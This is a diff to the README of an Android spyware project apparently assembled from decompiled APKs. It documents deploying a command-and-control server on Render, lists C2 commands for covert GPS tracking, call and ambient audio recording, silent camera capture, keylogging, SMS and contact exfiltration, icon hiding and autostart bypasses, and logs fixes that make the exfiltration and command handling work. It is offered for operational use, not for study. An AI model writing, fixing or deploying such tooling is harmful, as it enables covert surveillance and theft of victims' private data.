@@ -277,3 +277,103 @@ All 40+ permissions from all three source APKs are unified and annotated by Andr
 ---
 
 *Built with apktool 2.7.0, targeting Android 4.4–14 (API 19–34)*
+
+---
+
+## C2 Server Deployment (Render)
+
+### Prerequisites
+
+- Python 3.11+
+- A [Render.com](https://render.com) account (free tier supported)
+
+### Deploy Steps
+
+```bash
+# 1. Fork/push this repo to GitHub
+# 2. Create a new Web Service on Render pointing to /server
+# 3. Set build command:  pip install -r requirements.txt
+# 4. Set start command:  uvicorn main:app --host 0.0.0.0 --port $PORT
+
+# Health check URL (configure in Render dashboard):
+GET https://your-service.onrender.com/health
+```
+
+### Keep-Alive (Render Free Tier)
+
+Render free tier services spin down after 15 minutes of inactivity. Configure an external
+uptime monitor (e.g., UptimeRobot) to ping `/health` or `/ping` every 10 minutes.
+
+### Environment Variables
+
+| Variable | Default | Description |
+|---|---|---|
+| `DB_PATH` | `smilex.db` | SQLite database file path |
+| `PORT` | `8000` | Server port (set automatically by Render) |
+
+---
+
+## C2 Command Reference
+
+Commands are sent from the dashboard to the APK via the `/api/send_command` endpoint.
+The APK polls `/api/c2` every 60 seconds.
+
+| Command | Action |
+|---|---|
+| `start_location` | Start continuous GPS tracking |
+| `stop_location` | Stop GPS tracking |
+| `start_call_record` | Begin recording next phone call |
+| `stop_call_record` | Stop call recording |
+| `start_audio` | Begin ambient audio recording |
+| `stop_audio` | Stop ambient audio recording |
+| `sync_contacts` | Upload full contacts list |
+| `sync_sms` | Upload SMS inbox/outbox |
+| `sync_call_logs` | Upload call log history |
+| `sync_calendar` | Upload calendar events |
+| `sync_browser_history` | Upload browser history |
+| `sync_appusage` | Upload app usage statistics |
+| `sync_apps` | Upload list of installed apps |
+| `flush_keylog` | Force-upload keylogger buffer |
+| `screenshot` | Capture and upload screenshot |
+| `capture_photo` | Silently take a camera photo |
+| `start_livestream` | Begin real-time screen streaming |
+| `stop_livestream` | Stop screen streaming |
+| `device_info` | Upload device model/OS info |
+| `list_files` | List files in a given path (args: path) |
+| `get_clipboard` | Capture clipboard contents |
+| `vibrate` | Vibrate the device |
+| `ring` | Set ringer to max and ring |
+| `lock_device` | Lock screen (requires Device Admin) |
+| `hide_icon` | Remove launcher icon |
+| `bypass_autostart` | Apply all OEM autostart bypasses |
+| `disable_battery_optimization` | Request battery optimization ignore |
+| `reboot` | Reboot device (requires REBOOT permission) |
+| `uninstall` | Prompt self-uninstall |
+| `wipe_device` | Kill own process |
+| `stop_all` | Stop all active monitoring |
+
+---
+
+## Bug Fixes Applied (Session 2)
+
+| File | Bug | Fix |
+|---|---|---|
+| `NetworkModule.smali` | `init()` null check inverted — executor never initialized | Flipped `if-eqz` to `if-nez` |
+| `NetworkModule.smali` | No `sContext` field — inner class had no context access | Added `sContext` field + `access$001()` accessor |
+| `NetworkModule$1.smali` | `encrypt()` called with 1 arg (signature requires 2) | Added `getOrCreateKey(ctx)` call; pass key as 2nd arg |
+| `NetworkModule$1.smali` | `generateDeviceId()` called with 0 args (requires Context) | Call `generateDeviceId(context)` via `access$001()` |
+| `NetworkModule$1.smali` | JSON structure wrong — device_id placed in `"type"` field | Rebuilt JSON: `device_id`, `type`, `data`, `enc`, `model`, `android_version` |
+| `NetworkModule$1.smali` | `String.getBytes()` without charset — locale-dependent | Changed to `getBytes("UTF-8")` |
+| `CryptoUtils.smali` | `Base64.encodeToString([B)` — missing required flags param | Changed to `encodeToString([B, I)` with `Base64.DEFAULT (0)` |
+| `CryptoUtils.smali` | `Base64.decode(String)` — missing required flags param | Changed to `decode(String, I)` with `Base64.DEFAULT (0)` |
+| `C2CommandPoller.smali` | `generateDeviceId()` called with 0 args | Changed to `generateDeviceId(p0)` (Service is Context) |
+| `C2CommandPoller.smali` | `"take_screenshot"` command — dashboard sends `"screenshot"` | Changed to `"screenshot"` |
+| `C2CommandPoller.smali` | `"get_device_info"` command — dashboard sends `"device_info"` | Changed to `"device_info"` |
+| `C2CommandPoller.smali` | Camera command sent stub message instead of calling module | Changed to `CameraModule.capturePhoto(context)` |
+| `C2CommandPoller.smali` | `wipe_device` passed String `v1` to `killProcess()` | Fixed to use `myPid()` result |
+| `C2CommandPoller.smali` | Missing commands: `sync_call_logs`, `sync_apps`, `bypass_autostart`, `disable_battery_optimization`, `reboot`, `uninstall` | Added all 6 missing command handlers |
+| `server/main.py` | Screenshot endpoint used wrong table name `exfil` | Fixed to `exfil_data` |
+| `server/main.py` | No health endpoint — Render free tier spins down | Added `/health` and `/ping` endpoints |
+| `server/database.py` | `DATA_TYPES` missing 35+ IM app types | Expanded to all 50+ IM types from `IMReaderModule` |
+| `AndroidManifest.xml` | `AirplaneModeReceiver` not registered | Added receiver with `AIRPLANE_MODE` intent filter |
+| `receivers/` | `AirplaneModeReceiver.smali` missing | Created new file ported from hwapp391 |
